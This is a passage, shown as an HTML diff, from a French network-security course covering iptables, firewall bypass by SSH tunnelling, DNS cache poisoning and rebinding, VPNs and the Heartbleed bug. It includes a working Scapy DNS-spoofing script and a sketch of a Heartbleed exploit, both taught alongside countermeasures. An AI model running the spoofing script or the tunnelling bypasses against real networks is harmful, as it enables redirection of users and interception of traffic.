+  <li><strong>Politique par défaut</strong> : blocage tout sauf autorisé (<em>whitelist</em>) ou autoriser tout sauf bloqué (<em>blacklist</em>)</li>
+</ul>
+</div>
+</div>
+<div class="section-card" id="s174">
+  <h3 onclick="toggleSection(this)">17.4 iptables — Pare-feu Linux<span class="arrow">▼</span></h3>
+  <div class="section-body open">
+<p><strong>iptables</strong> est l'outil standard de pare-feu sous Linux. Il utilise des chaînes de règles pour filtrer les paquets.</p>
+<div class="diagram">
+  <div style="display:flex;gap:1rem;flex-wrap:wrap;justify-content:center">
+    <div class="diag-box" style="background:#312e81;flex:1;min-width:120px">INPUT<br><small>Paquets destinés à la machine locale</small></div>
+    <div class="diag-box" style="background:#1e3a5f;flex:1;min-width:120px">FORWARD<br><small>Paquets traversant la machine (routeur)</small></div>
+    <div class="diag-box" style="background:#312e81;flex:1;min-width:120px">OUTPUT<br><small>Paquets générés par la machine</small></div>
+  </div>
+</div>
+<h4>Commandes iptables essentielles</h4>
+<pre># Afficher les règles
+iptables -L -n -v
+
+# Bloquer tout le trafic entrant par défaut
+iptables -P INPUT DROP
+iptables -P FORWARD DROP
+
+# Autoriser SSH (port 22)
+iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+
+# Autoriser le trafic établi (Stateful)
+iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
+
+# Bloquer une IP spécifique
+iptables -A INPUT -s 10.0.2.100 -j DROP
+
+# Bloquer le ping (ICMP)
+iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
+
+# Autoriser uniquement Telnet depuis un sous-réseau
+iptables -A INPUT -p tcp -s 10.0.2.0/24 --dport 23 -j ACCEPT
+
+# NAT (partage de connexion)
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</pre>
+</div>
+</div>
+<div class="section-card" id="s175">
+  <h3 onclick="toggleSection(this)">17.5 Contournement de Pare-feu<span class="arrow">▼</span></h3>
+  <div class="section-body open">
+<p>Les pare-feux peuvent être contournés par plusieurs techniques :</p>
+<h4>SSH Tunneling</h4>
+<p>Encapsuler du trafic interdit dans une connexion SSH autorisée :</p>
+<pre># Tunnel local : accéder à internal:80 via localhost:8080
+ssh -L 8080:internal-server:80 user@jump-host
+
+# Tunnel reverse : exposer un service local derrière un firewall
+ssh -R 9090:localhost:80 user@external-server
+
+# SOCKS proxy (tunnel dynamique)
+ssh -D 1080 user@external-server
+# Puis configurer le navigateur pour utiliser SOCKS5 sur localhost:1080</pre>
+<h4>VPN (Virtual Private Network)</h4>
+<p>Le trafic est encapsulé dans un tunnel chiffré, le pare-feu ne voit que le protocole VPN (souvent UDP/443 ou TCP/443).</p>
+<div class="tip">💡 Les pare-feux sont contournables — une bonne politique de sécurité nécessite plusieurs couches de défense (defense-in-depth).</div>
+</div>
+</div>
+</div>
+<div class="ch-page" id="ch18">
+  <div class="ch-hero" style="border-color:#06b6d444">
+    <span class="num">18</span>
+    <div style="font-size:2rem;margin-bottom:.5rem">🌐</div>
+    <h1 style="color:#06b6d4">DNS et Attaques DNS</h1>
+    <div class="sub">Chapitre 18 — Domain Name System & Attacks</div>
+  </div>
+  
+<div class="section-card" id="s181">
+  <h3 onclick="toggleSection(this)">18.1 Fonctionnement du DNS<span class="arrow">▼</span></h3>
+  <div class="section-body open">
+<p>Le <strong>DNS</strong> (Domain Name System) traduit les noms de domaine (ex: <code>google.com</code>) en adresses IP. C'est l'annuaire téléphonique d'Internet.</p>
+<div class="diagram">
+  <div style="text-align:center">
+    <div class="diag-box" style="background:#1e3a5f">Client → "Quelle est l'IP de google.com ?"</div>
+    <div class="diag-arrow">↓ 1. Requête récursive</div>
+    <div class="diag-box" style="background:#312e81">Résolveur local (cache DNS)</div>
+    <div class="diag-arrow">↓ 2. Si pas en cache</div>
+    <div class="diag-box" style="background:#1e3a5f">Root Server (.) → "Demandez .com"</div>
+    <div class="diag-arrow">↓ 3.</div>
+    <div class="diag-box" style="background:#1e3a5f">TLD Server (.com) → "Demandez google.com NS"</div>
+    <div class="diag-arrow">↓ 4.</div>
+    <div class="diag-box" style="background:#14532d">Serveur Autoritaire google.com → "142.250.x.x"</div>
+  </div>
+</div>
+<h4>Types d'enregistrements DNS</h4>
+<table><thead><tr><th>Type</th><th>Description</th><th>Exemple</th></tr></thead><tbody>
+<tr><td><strong>A</strong></td><td>Nom → IPv4</td><td>google.com → 142.250.74.14</td></tr>
+<tr><td><strong>AAAA</strong></td><td>Nom → IPv6</td><td>google.com → 2a00:1450:...</td></tr>
+<tr><td><strong>NS</strong></td><td>Name Server</td><td>google.com NS ns1.google.com</td></tr>
+<tr><td><strong>MX</strong></td><td>Mail Exchange</td><td>google.com MX smtp.google.com</td></tr>
+<tr><td><strong>PTR</strong></td><td>IP → Nom (reverse)</td><td>142.250.74.14 → google.com</td></tr>
+<tr><td><strong>TTL</strong></td><td>Durée en cache (secondes)</td><td>300 = 5 minutes</td></tr>
+</tbody></table>
+<p><strong>Protocole :</strong> UDP port 53 (requêtes &lt;512 octets). TCP port 53 (transferts de zones, réponses &gt;512 octets).</p>
+</div>
+</div>
+<div class="section-card" id="s182">
+  <h3 onclick="toggleSection(this)">18.2 Attaque DNS Cache Poisoning<span class="arrow">▼</span></h3>
+  <div class="section-body open">
+<p>Le <strong>DNS cache poisoning</strong> consiste à injecter de fausses réponses DNS dans le cache d'un résolveur, pour rediriger les utilisateurs vers un serveur malveillant.</p>
+<h4>Pourquoi DNS est vulnérable ?</h4>
+<ul>
+  <li><strong>Pas d'authentification</strong> : n'importe qui peut envoyer une réponse DNS</li>
+  <li><strong>Transaction ID</strong> : seulement 16 bits → 65 536 valeurs possibles</li>
+  <li><strong>Effet cache</strong> : une fausse réponse reste des heures/jours</li>
+</ul>
+<h4>Attaque de Kaminsky (2008)</h4>
+<div class="diagram">
+  <div style="text-align:center">
+    <div class="diag-box" style="background:#7f1d1d">Attaquant</div>
+    <div>1. Demande random-xyz.example.com (force nouvelle requête)</div>
+    <div>2. Envoie 65536 fausses réponses avec tous les Transaction IDs</div>
+    <div class="diag-box" style="background:#312e81">Résolveur victime</div>
+    <div>Si une réponse a le bon ID → le cache est empoisonné !</div>
+    <div class="diag-box" style="background:#7f1d1d">Tous les utilisateurs redirigés vers serveur malveillant 😈</div>
+  </div>
+</div>
+<pre>from scapy.all import *
+# Empoisonner le cache DNS pour example.com
+def poison(pkt):
+    if DNS in pkt and pkt[DNS].qr == 0:  # requête
+        fake = IP(dst=pkt[IP].src) /                UDP(dport=pkt[UDP].sport, sport=53) /                DNS(id=pkt[DNS].id, qr=1, aa=1,
+                   an=DNSRR(rrname="example.com",
+                            rdata="malicious-ip"))
+        send(fake)
+sniff(filter="udp port 53", prn=poison)</pre>
+<h4>Contre-mesures</h4>
+<ul>
+  <li><strong>Randomisation du port source</strong> : augmente l'espace à 65536 × 65536 combinaisons</li>
+  <li><strong>DNSSEC</strong> : signatures cryptographiques authentifiant les réponses</li>
+  <li><strong>DNS over HTTPS (DoH)</strong> / <strong>DNS over TLS (DoT)</strong></li>
+</ul>
+</div>
+</div>
+<div class="section-card" id="s183">
+  <h3 onclick="toggleSection(this)">18.3 DNS Rebinding<span class="arrow">▼</span></h3>
+  <div class="section-body open">
+<p>L'attaque de <strong>DNS Rebinding</strong> contourne la <em>Same-Origin Policy</em> (SOP) du navigateur pour accéder à des ressources du réseau local depuis un site distant.</p>
+<h4>Bypass de la Same-Origin Policy</h4>
+<ol>
+  <li>L'attaquant contrôle <code>attacker.com</code> avec un TTL très court (0)</li>
+  <li>La victime visite <code>attacker.com</code> → résolution DNS donne l'IP de l'attaquant</li>
+  <li>Le JavaScript de l'attaquant s'exécute dans le navigateur</li>
+  <li>Le DNS de <code>attacker.com</code> est changé → pointe maintenant vers <code>192.168.1.1</code> (routeur local)</li>
+  <li>Le navigateur pense que <code>attacker.com</code> = même origine que le routeur</li>
+  <li>Le JS peut accéder au routeur, aux IoT, etc.</li>
+</ol>
+<div class="warn">⚠️ Utilisé pour attaquer des appareils IoT (caméras, routeurs) sur le réseau local de la victime !</div>
+<h4>Contre-mesures</h4>
+<ul>
+  <li>Vérifier l'en-tête <strong>Host</strong> côté serveur</li>
+  <li>Utiliser HTTPS avec certificats valides</li>
+  <li>Configurer les routeurs pour refuser les requêtes avec Host inattendu</li>
+</ul>
+</div>
+</div>
+</div>
+<div class="ch-page" id="ch19">
+  <div class="ch-hero" style="border-color:#10b98144">
+    <span class="num">19</span>
+    <div style="font-size:2rem;margin-bottom:.5rem">🔐</div>
+    <h1 style="color:#10b981">VPN — Réseau Privé Virtuel</h1>
+    <div class="sub">Chapitre 19 — Virtual Private Network</div>
+  </div>
+  
+<div class="section-card" id="s191">
+  <h3 onclick="toggleSection(this)">19.1 Introduction au VPN<span class="arrow">▼</span></h3>
+  <div class="section-body open">
+<p>Un <strong>VPN</strong> (Virtual Private Network) crée un tunnel chiffré entre deux machines sur un réseau non fiable (Internet). Il permet de :</p>
+<ul>
+  <li><strong>Relier deux réseaux distants</strong> de façon sécurisée (VPN site-à-site)</li>
+  <li><strong>Télétravail sécurisé</strong> : accéder au réseau d'entreprise depuis chez soi</li>
+  <li><strong>Confidentialité</strong> : chiffrer tout le trafic, masquer l'IP réelle</li>
+  <li><strong>Contourner la censure</strong> ou les restrictions géographiques</li>
+</ul>
+<div class="diagram">
+  <div style="display:flex;gap:1rem;align-items:center;justify-content:center;flex-wrap:wrap">
+    <div class="diag-box" style="background:#14532d">Réseau A<br>10.0.1.0/24</div>
+    <div style="text-align:center;flex:1">
+      <div style="color:#6366f1;font-weight:bold">══════ Tunnel VPN (chiffré) ══════</div>
+      <div style="font-size:.8rem;color:#94a3b8">Internet (non fiable)</div>
+    </div>
+    <div class="diag-box" style="background:#14532d">Réseau B<br>192.168.1.0/24</div>
+  </div>
+</div>
+</div>
+</div>
+<div class="section-card" id="s192">
+  <h3 onclick="toggleSection(this)">19.2 TUN/TAP — Interface VPN Linux<span class="arrow">▼</span></h3>
+  <div class="section-body open">
+<p>Sous Linux, les VPNs utilisent des interfaces virtuelles <strong>TUN</strong> ou <strong>TAP</strong> :</p>
+<table><thead><tr><th>Type</th><th>Couche</th><th>Utilisation</th></tr></thead><tbody>
+<tr><td><strong>TUN</strong></td><td>L3 (IP)</td><td>Paquets IP → VPN de type routé</td></tr>
+<tr><td><strong>TAP</strong></td><td>L2 (Ethernet)</td><td>Frames Ethernet → VPN de type bridge</td></tr>
+</tbody></table>
+<pre># Créer une interface TUN
+ip tuntap add dev tun0 mode tun
+ip addr add 10.8.0.1/24 dev tun0
+ip link set tun0 up
+ip route add 192.168.1.0/24 dev tun0</pre>
+<h4>Fonctionnement d'un VPN TUN</h4>
+<ol>
+  <li>Application envoie un paquet vers 192.168.1.5</li>
+  <li>Le noyau route le paquet vers l'interface <code>tun0</code></li>
+  <li>Le programme VPN lit le paquet depuis <code>tun0</code></li>
+  <li>Il le <strong>chiffre et encapsule</strong> dans un paquet UDP/TCP</li>
+  <li>L'envoie vers le serveur VPN via Internet</li>
+  <li>Le serveur VPN décapsule, déchiffre → injecte dans son interface tun0</li>
+</ol>
+</div>
+</div>
+<div class="section-card" id="s193">
+  <h3 onclick="toggleSection(this)">19.3 OpenVPN et SSH Tunneling<span class="arrow">▼</span></h3>
+  <div class="section-body open">
+<h4>OpenVPN</h4>
+<p><strong>OpenVPN</strong> est une implémentation VPN open-source basée sur TLS/SSL :</p>
+<pre># Serveur OpenVPN (openvpn.conf)
+dev tun
+proto udp
+port 1194
+ca   ca.crt
+cert server.crt
+key  server.key
+dh   dh2048.pem
+server 10.8.0.0 255.255.255.0
+push "route 192.168.1.0 255.255.255.0"
+
+# Client
+openvpn --config client.ovpn</pre>
+<h4>SSH Tunneling (alternative légère)</h4>
+<pre># Tunnel local : localhost:8080 → serveur_interne:80
+ssh -L 8080:serveur_interne:80 user@vpn_server
+
+# Tunnel inverse : port 9090 du serveur → localhost:22
+ssh -R 9090:localhost:22 user@vpn_server
+
+# SOCKS5 proxy dynamique (remplace un VPN complet)
+ssh -D 1080 user@vpn_server
+# Navigateur → Proxy SOCKS5 → localhost:1080</pre>
+<div class="tip">💡 SSH tunneling est pratique pour contourner un firewall qui bloque tout sauf le port 22 !</div>
+</div>
+</div>
+</div>
+<div class="ch-page" id="ch20">
+  <div class="ch-hero" style="border-color:#ec489944">
+    <span class="num">20</span>
+    <div style="font-size:2rem;margin-bottom:.5rem">💔</div>
+    <h1 style="color:#ec4899">Le Bug Heartbleed</h1>
+    <div class="sub">Chapitre 20 — The Heartbleed Bug & Attack</div>
+  </div>
+  
+<div class="section-card" id="s201">
+  <h3 onclick="toggleSection(this)">20.1 Description du Bug<span class="arrow">▼</span></h3>
+  <div class="section-body open">
+<p>Le bug <strong>Heartbleed</strong> (CVE-2014-0160) est une vulnérabilité critique dans <strong>OpenSSL</strong> qui a affecté des millions de serveurs web entre 2012 et 2014.</p>
+<div class="danger">🚨 CVSS Score: 7.5 (HIGH) — Permet de lire la mémoire du serveur, y compris les clés privées SSL !</div>
+<h4>Le protocole Heartbeat (RFC 6520)</h4>
+<p>Le heartbeat TLS permet de <em>garder une connexion TLS active</em> en envoyant un message "je suis vivant" :</p>
+<ol>
+  <li>Client envoie : <code>[Type=Heartbeat, Length=100, "AAAA..."]</code></li>
+  <li>Serveur répond : <code>[Type=Heartbeat, Length=100, "AAAA..."]</code></li>
+  <li>Le serveur copie <code>length</code> octets depuis sa mémoire dans la réponse</li>
+</ol>
+<h4>Le bug : absence de validation</h4>
+<div class="diagram">
+  <div style="text-align:center">
+    <div class="diag-box" style="background:#7f1d1d">Attaquant envoie :<br>Length=65535 mais Payload="AA" (2 octets seulement)</div>
+    <div class="diag-arrow">↓</div>
+    <div class="diag-box" style="background:#7c2d12">OpenSSL vulnérable :<br>Ne vérifie pas que Length ≤ taille réelle du payload</div>
+    <div class="diag-arrow">↓</div>
+    <div class="diag-box" style="background:#7f1d1d">Serveur répond avec 65535 octets de sa MÉMOIRE INTERNE<br>= mots de passe, cookies, clés privées SSL !</div>
+  </div>
+</div>
+</div>
+</div>
+<div class="section-card" id="s202">
+  <h3 onclick="toggleSection(this)">20.2 Code vulnérable et Exploitation<span class="arrow">▼</span></h3>
+  <div class="section-body open">
+<h4>Code OpenSSL vulnérable (simplifié)</h4>
+<pre>// VULNÉRABLE — OpenSSL avant 1.0.1g
+int tls1_process_heartbeat(SSL *s) {
+    unsigned char *p = &s->s3->rrec.data[0];
+    unsigned int payload;
+
+    // Lire le type et la longueur déclarée par le client
+    hbtype = *p++;
+    n2s(p, payload);  // ← Length déclarée par le CLIENT (non vérifiée !)
+
+    // BUG : on copie 'payload' octets depuis la mémoire
+    // sans vérifier si le vrai message est aussi long !
+    memcpy(bp, pl, payload);  // ← Lit jusqu'à 64KB de mémoire !
+}</pre>
+<h4>Correction (OpenSSL 1.0.1g)</h4>
+<pre>// CORRIGÉ
+if (payload + padding > s->s3->rrec.length)
+    return 0;  // Rejeter si length > taille réelle</pre>
+<h4>Exploitation avec Python</h4>
+<pre>import socket, struct
+
+def heartbleed(host, port=443):
+    s = socket.socket()
+    s.connect((host, port))
+    # Envoyer le handshake TLS...
+    # Envoyer le heartbeat malveillant
+    payload = b' @ '
+    # Type=18(heartbeat), Version=3.2, Length=3,
+    # Heartbeat type=1, PAYLOAD LENGTH=16384 (truqué !)
+    s.send(payload)
+    data = s.recv(65535)
+    print("Mémoire volée:", data.hex())</pre>
+<h4>Impact et leçons</h4>
+<ul>
+  <li>~500 000 serveurs affectés (17% des serveurs HTTPS)</li>
+  <li>Clés privées SSL, mots de passe, cookies de session compromis</li>
+  <li><strong>Leçon</strong> : Toujours valider les entrées utilisateur, même dans des protocoles de bas niveau !</li>
+</ul>
+<div class="tip">✅ Correction : mettre à jour OpenSSL ≥ 1.0.1g et regénérer tous les certificats SSL !</div>
+</div>
+</div>
+</div>
+</main>
+<script>
+function showChapter(id) {
+  document.querySelectorAll('.ch-page').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.ch-link').forEach(l => l.classList.remove('active'));
+  document.getElementById('welcome').style.display = 'none';
+  var page = document.getElementById(id);
+  if(page) { page.classList.add('active'); }
+  var link = document.querySelector('[data-ch="' + id + '"]');
+  if(link) {
+    link.classList.add('active');
+    var secs = link.nextElementSibling;
+    if(secs && secs.classList.contains('sec-links')) secs.classList.add('open');
+  }
+  // Close sidebar on mobile
+  if(window.innerWidth <= 768) {
+    document.getElementById('sidebar').classList.remove('visible');
+  }
+  window.scrollTo(0,0);
+}
+function showHome() {
+  document.querySelectorAll('.ch-page').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.ch-link').forEach(l => l.classList.remove('active'));
+  document.getElementById('welcome').style.display = 'block';
+}
+function toggleSection(el) {
+  var body = el.nextElementSibling;
+  var arrow = el.querySelector('.arrow');
+  body.classList.toggle('open');
+  if(arrow) arrow.textContent = body.classList.contains('open') ? '▲' : '▼';
+}
+function toggleSidebar() {
+  var sb = document.getElementById('sidebar');
+  if(window.innerWidth <= 768) {
+    sb.classList.toggle('visible');
+  } else {
+    sb.classList.toggle('hidden');
+    document.getElementById('main').classList.toggle('full');
+    var btn = document.getElementById('sidebar').classList.contains('hidden');
+    document.getElementById('mainEl').style.marginLeft = btn ? '0' : '260px';
+  }
+}
+function scrollToSection(secId) {
+  var el = document.getElementById(secId);
+  if(el) { el.scrollIntoView({behavior:'smooth'}); el.querySelector('h3').click(); }
+}
+</script>
+</body>
+</html>
